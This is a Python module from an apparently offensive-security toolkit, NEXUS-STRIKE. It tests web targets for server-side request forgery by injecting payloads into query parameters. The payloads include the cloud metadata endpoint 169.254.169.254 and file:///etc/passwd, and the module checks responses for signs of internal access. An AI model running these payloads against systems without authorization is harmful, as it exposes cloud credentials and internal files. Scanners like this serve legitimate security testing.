#!/usr/bin/env python3
"""
NEXUS-STRIKE — webapp.ssrf
Domain: webapp
Real Server-Side Request Forgery (SSRF) detector.
"""
from __future__ import annotations
from nexus.foundation.net import safe_urlopen
import urllib.request
import urllib.parse
import ssl
import time
from typing import Any
from nexus.foundation.schema import Finding, STATUS_COMPLETED, STATUS_NO_FINDINGS, STATUS_FAILED, tool_result
from nexus.tools.registry import tool_registry
from nexus.foundation.ssl_config import get_ssl_context

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "file:///etc/passwd"
]

def run(target: str, **kwargs: Any) -> dict:
    """Perform Server-Side Request Forgery (SSRF) testing."""
    findings = []
    vuln_indicators = []
    
    try:
        url = target if "://" in target else f"http://{target}"
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params = {k: v[0] if v else "" for k, v in params.items()}
        
        if not params:
            params = {"url": "http://example.com", "redirect": "http://example.com", "path": "/"}
            
        ctx = get_ssl_context(target, allow_insecure=True)
        
        for param in list(params.keys())[:3]:
            for payload in SSRF_PAYLOADS:
                test_url = _inject_url(url, param, payload)
                try:
                    req = urllib.request.Request(
                        test_url,
                        headers={"User-Agent": "NEXUS-STRIKE/0.2.0 (SSRF Detector)"},
                        method="GET"
                    )
                    t0 = time.time()
                    resp = safe_urlopen(req, timeout=5, context=ctx)
                    elapsed = time.time() - t0
                    body = resp.read(65536).decode("utf-8", errors="replace")
                    
                    if "root:x:" in body or "ami-id" in body.lower() or (elapsed > 4 and "169.254" in payload):
                        vuln_indicators.append({"param": param, "payload": payload, "evidence": "Internal resource accessed"})
                        findings.append(Finding(
                            title="Server-Side Request Forgery (SSRF) Vulnerability",
                            severity="critical",
                            confidence="high",
                            affected_asset=url,
                            evidence=f"Parameter '{param}' successfully fetched internal resource via payload: {payload}",
                            remediation="Implement strict allow-listing for URLs. Disable support for HTTP redirects. Block access to internal IP ranges (127.0.0.0/8, 169.254.169.254, etc.).",
                            tool="webapp.ssrf",
                            references=["CWE-918", "OWASP-A10"]
                        ))
                        break
                except Exception:
                    pass
                    
        summary = f"SSRF testing completed. Found {len(vuln_indicators)} potential vulnerabilities."
        status = STATUS_COMPLETED if vuln_indicators else STATUS_NO_FINDINGS
        
    except Exception as e:
        return tool_result("webapp.ssrf", target, status=STATUS_FAILED, error=str(e))

    return tool_result(
        "webapp.ssrf", target,
        status=status,
        findings=findings,
        summary=summary,
        metadata={"vulnerabilities": vuln_indicators}
    )

def _inject_url(target: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(target)
    query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
    query[param] = payload
    return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(query)))

tool_registry.register("webapp.ssrf", run, metadata={
    "name": "webapp.ssrf",
    "domain": "webapp",
    "status": "completed",
    "description": "Server-Side Request Forgery (SSRF) detection via internal IP and metadata payloads",
    "parameters": {"target": "Target URL with query parameters"},
})